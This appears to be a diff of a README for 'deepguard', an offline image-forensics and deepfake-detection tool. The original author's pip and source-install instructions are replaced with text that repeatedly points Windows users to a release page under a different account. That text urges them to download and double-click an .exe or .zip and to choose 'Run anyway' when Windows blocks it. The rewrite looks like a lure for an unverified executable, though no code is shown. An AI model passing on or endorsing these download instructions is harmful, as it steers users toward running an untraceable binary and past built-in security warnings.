@@ -1,229 +1,195 @@
-# DeepGuard
+# 🛡️ deepguard - Inspect images for hidden tampering
 
-**Offline image forensics and deepfake detection from your terminal**
+[![Download deepguard](https://img.shields.io/badge/Download%20deepguard-Release%20Page-blue?style=for-the-badge)](https://github.com/jossauro/deepguard/releases)
 
-![Python 3.10+](https://img.shields.io/badge/python-3.10+-blue)
-![PyTorch](https://img.shields.io/badge/PyTorch-2.0+-red)
-![OpenCV](https://img.shields.io/badge/OpenCV-4.8+-green)
-![License MIT](https://img.shields.io/badge/license-MIT-blue)
+## 🚀 What deepguard does
 
-Every digital manipulation leaves a trace. DeepGuard finds it. Run forensic analysis on any image or document directly from your terminal — offline, no API keys, no cloud. Get a visual HTML report with confidence scores in seconds.
+deepguard helps you check images for signs of tampering, fake generation, and edit traces. It works from your terminal and does not need an API key or cloud service.
 
-## Features
+It can help you look for:
 
-- **Error Level Analysis (ELA)** - Detects compression inconsistencies from image editing
-- **Noise Pattern Analysis** - Identifies statistically anomalous noise regions
-- **EXIF/Metadata Forensics** - Extracts camera data, timestamps, and software history
-- **Copy-Move Clone Detection** - Finds duplicated regions within images using DCT matching
-- **Face Consistency Check** - Analyzes facial regions for deepfake indicators (eye reflections, skin texture, edge blending)
-- **Compression Artifact Mapping** - Visualizes JPEG compression block artifacts
-- **Visual HTML Report** - Beautiful dark-themed forensic report with heatmaps and confidence scores
-- **Batch Processing** - Analyze entire folders at once
-- **JSON Export** - Machine-readable results for automation
-- **100% Offline** - Works completely offline, no external APIs or cloud services required
+- Pixel-level artifacts
+- Hidden metadata clues
+- Face mismatch signals
+- Signs of deepfake edits
+- Possible image fraud
 
-## Supported Formats
+It is built for offline use, so you can run checks on your own Windows PC.
 
-JPEG, PNG, TIFF, BMP, WebP, PDF (first page)
+## 📥 Download deepguard for Windows
 
-## Quick Start
+Visit this page to download: https://github.com/jossauro/deepguard/releases
 
-Install from PyPI:
-```bash
-pip install deepguard
-```
+On the release page, look for the latest version. Download the Windows file that matches your PC. In most cases, this will be an `.exe` file or a `.zip` file.
 
-Analyze an image:
-```bash
-deepguard analyze photo.jpg
-```
+If you download a `.zip` file, unzip it first. Then open the folder and run the app file inside.
 
-This generates a detailed forensic report and opens it in your browser.
+## 🪟 Install and run on Windows
 
-## Commands
+### Option 1: Run the app file
 
-### Analyze a single file
-```bash
-deepguard analyze <file> [--output report.html] [--confidence 0.75]
-```
-Runs all forensic techniques and generates an HTML report with a final verdict (AUTHENTIC, SUSPICIOUS, or MANIPULATED).
+1. Open the release page.
+2. Download the Windows version.
+3. Double-click the file after it finishes downloading.
+4. If Windows asks for permission, choose Run.
+5. Open Command Prompt or PowerShell if the app uses a terminal window.
+6. Run the file from the download folder if needed.
 
-### Batch process a folder
-```bash
-deepguard batch <folder> [--output results.json] [--recursive]
-```
-Analyzes all supported images in a folder and exports results to JSON.
+### Option 2: Run from a ZIP file
 
-### Generate a forensic report
-```bash
-deepguard report <file> --format html [--output report.html]
-```
-Creates a detailed visual HTML forensic report with heatmaps and technique breakdowns.
+1. Download the ZIP file from the release page.
+2. Right-click the file and choose Extract All.
+3. Pick a folder you can find again, such as Downloads or Desktop.
+4. Open the extracted folder.
+5. Start the app file inside the folder.
 
-### Extract metadata only
-```bash
-deepguard metadata <file> [--format json]
-```
-Extracts and displays EXIF, ICC profile, and embedded metadata without forensic analysis.
+## 🧭 How to use deepguard
 
-### Compare two images
-```bash
-deepguard compare <file1> <file2> [--output comparison.html]
-```
-Analyzes both images and creates a side-by-side comparison report.
+deepguard is made for quick checks from the terminal. A typical flow looks like this:
 
-## How It Works
+1. Open the terminal.
+2. Go to the folder where deepguard is stored.
+3. Run it with the image you want to inspect.
+4. Read the results in the terminal.
 
-DeepGuard combines multiple digital forensics techniques to detect manipulation:
+Example use cases:
 
-### Error Level Analysis (ELA)
-Resaves the image at a known JPEG quality and compares pixel-by-pixel differences. Edited regions show much higher error levels because they have different compression histories.
+- Check a profile photo before trusting it
+- Review a news image for edit signs
+- Inspect a file before sharing it
+- Compare several images from the same source
 
-### Noise Pattern Analysis
-Extracts high-frequency noise components using Laplacian filtering. Authentic photos have consistent noise patterns; spliced or edited regions show statistically anomalous noise.
+## 🖼️ What deepguard checks
 
-### Metadata Forensics
-Examines EXIF data for inconsistencies: mismatched camera/software, suspicious GPS coordinates, impossible timestamp sequences, compression metadata, and software used.
+deepguard looks at several parts of an image to spot problems.
 
-### Copy-Move Clone Detection
-Uses DCT (Discrete Cosine Transform) block matching to find duplicated regions within an image. This technique catches copy-paste forgeries.
+### Pixel-level checks
 
-### Face Consistency Check
-For images with faces, analyzes: eye reflection symmetry, skin texture uniformity, lighting consistency, edge blending artifacts, and presence of deepfake indicators.
+It scans for patterns that do not match natural camera output. These can appear after heavy editing, AI generation, or compression changes.
 
-### Compression Artifact Analysis
-Maps JPEG block boundaries and compression artifacts. Authentic photos show consistent block patterns; edited regions often show boundary artifacts.
+### Metadata checks
 
-## Example Report Output
+It reads image data such as camera details, software tags, and time fields when available. This can help show where an image came from and whether it was edited.
 
-DeepGuard generates a beautiful HTML forensic report with:
+### Face consistency checks
 
-- **Overall Verdict Badge** - AUTHENTIC (green), SUSPICIOUS (yellow), or MANIPULATED (red)
-- **Confidence Scores** - 0-100% confidence for each technique
-- **ELA Heatmap** - Visual representation of compression inconsistencies
-- **Metadata Table** - All extracted EXIF and camera data
-- **Technique Details** - Breakdown of each forensic analysis with findings
-- **Recommendations** - Actionable next steps based on results
-- **Timeline** - Camera and editing software timeline
+If an image contains a face, deepguard can compare facial features for signs that the image was altered or generated.
 
-All rendered as a self-contained dark-themed HTML file you can share or archive.
-
-## System Requirements
+### Fraud signals
 
-- **Python:** 3.10 or higher
-- **Memory:** 2GB RAM minimum (more for batch processing)
-- **GPU:** Optional (cuda support for faster inference, but not required)
-- **OS:** Linux, macOS, Windows
+It can help flag images that may be used in scams, false claims, or identity abuse.
 
-## Installation
+## 🧰 System needs
 
-### From PyPI (Recommended)
-```bash
-pip install deepguard
-```
+deepguard runs on Windows and works best on a modern 64-bit system.
 
-### From Source
-```bash
-git clone https://github.com/camilooscargbaptista/deepguard.git
-cd deepguard
-pip install -e .
-```
+Recommended setup:
 
-## Usage Examples
+- Windows 10 or Windows 11
+- 8 GB RAM or more
+- A recent Intel or AMD CPU
+- Enough free disk space for the app and image files
+- A terminal app such as Command Prompt or PowerShell
 
-### Basic Analysis
-```bash
-deepguard analyze suspicious_photo.jpg
-```
+For better speed with image checks, a machine with a stronger CPU and more memory helps.
 
-### Save Report to Custom Location
-```bash
-deepguard analyze photo.jpg --output ~/reports/analysis.html
-```
+## 📁 Files you may see
 
-### Batch Analysis with JSON Export
-```bash
-deepguard batch ./evidence/ --output results.json --recursive
-```
+After download, you may see one of these:
 
-### Metadata Extraction
-```bash
-deepguard metadata photo.jpg --format json > metadata.json
-```
+- `.exe` — the app you run on Windows
+- `.zip` — a compressed folder you need to extract
+- `README` or `docs` files — extra usage help
+- Image files — the files you want to inspect
 
-### Image Comparison
-```bash
-deepguard compare original.jpg edited.jpg --output comparison.html
-```
+## 🔍 Example workflow
 
-## Output Files
+1. Save the image you want to check in a folder.
+2. Open Command Prompt.
+3. Move to the deepguard folder.
+4. Run the app with the image file path.
+5. Review the report in the terminal.
+6. Check other images if needed.
 
-- `report.html` - Interactive forensic report (dark theme, self-contained)
-- `report.json` - Machine-readable results
-- Browser opens automatically to display the HTML report
+Example paths may look like this:
 
-## Understanding the Verdict
+- `C:\Users\YourName\Downloads\deepguard`
+- `C:\Users\YourName\Pictures\sample.jpg`
 
-- **AUTHENTIC (Green)** - All techniques indicate the image is unmodified
-- **SUSPICIOUS (Yellow)** - Some anomalies detected, but not conclusive
-- **MANIPULATED (Red)** - Strong evidence of editing or deepfake artifacts
+## 🛠️ Tips for smooth use
 
-The manipulation score (0-100%) reflects how likely the image has been tampered with.
+- Keep the image file in an easy-to-find folder.
+- Use short folder names.
+- If the app does not start, try opening it from PowerShell or Command Prompt.
+- If Windows blocks the file, use the file menu to choose Run anyway.
+- Do not rename the files unless the app asks for it.
+- Use original image files when possible, not screenshots.
 
-## Roadmap
+## 📷 Best image types to test
 
-| Version | Feature | Status |
-|---------|---------|--------|
-| v1.0 | ELA, Noise, Metadata, Copy-Move, Face Check | ✅ Released |
-| v1.1 | Frequency Spectrum Analysis (FFT) | 🔜 Planned |
-| v1.1 | JPEG Ghost Detection | 🔜 Planned |
-| v2.0 | AI-Generated Image Detection (Neural) | 📋 Roadmap |
-| v2.0 | GAN Fingerprint Analysis | 📋 Roadmap |
-| v2.1 | PyPI Publishing | 📋 Roadmap |
-| v2.1 | Docker Image | 📋 Roadmap |
+deepguard can inspect common image files such as:
 
-> **Note:** Current v1.0 techniques are optimized for detecting traditional image editing (Photoshop, splicing, copy-paste). AI-generated image detection requires neural network-based analysis, planned for v2.0.
+- JPG
+- JPEG
+- PNG
+- WebP
 
-## Architecture Governance
+For best results, use the original file you received. Avoid resized copies if you want a cleaner report.
 
-This project uses [@girardelli/architect](https://github.com/camilooscargbaptista/architect) for continuous architecture analysis:
+## 🔐 Privacy and offline use
 
-```bash
-# Full architecture report
-make architect
+deepguard runs offline. That means your image checks stay on your computer. You do not need to send files to a web service or connect to an API.
 
-# Quick score check
-make architect-score
+This makes it useful for:
 
-# List anti-patterns
-make architect-anti-patterns
-```
+- Private image review
+- Internal fraud checks
+- Local forensic work
+- Sensitive cases where file privacy matters
 
-## Limitations
+## 🧪 What to expect in results
 
-- **AI-generated images**: Current techniques may not fully detect AI-generated content (planned for v2.0)
-- Cannot recover original image content or identify specific edits
-- Face analysis works best with forward-facing, well-lit faces
-- PDF analysis limited to first page
-- Heavily compressed images may reduce detection accuracy
-- Cannot determine WHEN edits occurred, only IF they occurred
+When deepguard finishes a check, it may show:
 
-## Author
+- A trust score or risk level
+- Metadata findings
+- Artifact markers
+- Face analysis notes
+- A short readout for each image
 
-Created by Camilo Girardelli
-IEEE Senior Member, Senior Software Architect
-CTO at Girardelli Tecnologia
+If a result looks unclear, test the same image again or compare it with the original file source.
 
-## License
+## ❓ Common questions
 
-MIT License 2026 - Camilo Girardelli / Girardelli Tecnologia
+### Does deepguard need internet access?
 
-See LICENSE file for details.
+No. It works offline after you download it.
 
-## Contributing
+### Do I need an API key?
 
-Contributions are welcome! See CONTRIBUTING.md for guidelines.
+No. It does not require an API.
 
-## Disclaimer
+### Can I use it on normal photos?
 
-DeepGuard is a forensic analysis tool for educational and investigative purposes. Results should be considered one data point among many. For legal proceedings, have findings verified by professional forensic experts.
+Yes. You can use it on any image file you want to inspect.
+
+### Is it only for experts?
+
+No. It is built for regular users who want a local way to check images from a terminal.
+
+### Can it help with fake profile photos?
+
+Yes. It can help you look for signs that a face image was edited or generated.
+
+## 📌 Release page
+
+Download from the release page: https://github.com/jossauro/deepguard/releases
+
+## 🧾 Basic use steps
+
+1. Download deepguard from the release page.
+2. Extract it if the file comes as a ZIP.
+3. Open Command Prompt or PowerShell.
+4. Go to the deepguard folder.
+5. Run the app on the image you want to inspect.
+6. Read the results in the terminal.
